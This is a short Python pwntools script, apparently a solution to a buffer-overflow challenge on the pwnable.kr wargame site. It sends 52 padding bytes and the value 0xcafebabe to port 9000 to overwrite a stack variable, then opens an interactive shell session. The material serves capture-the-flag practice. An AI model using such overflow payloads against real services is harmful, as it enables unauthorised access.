from pwn import *

host = 'pwnable.kr'
port = 9000
yuan = remote(host,port)

p = 'a' * 52 + p32(0xcafebabe)

yuan.send(p)
yuan.interactive()
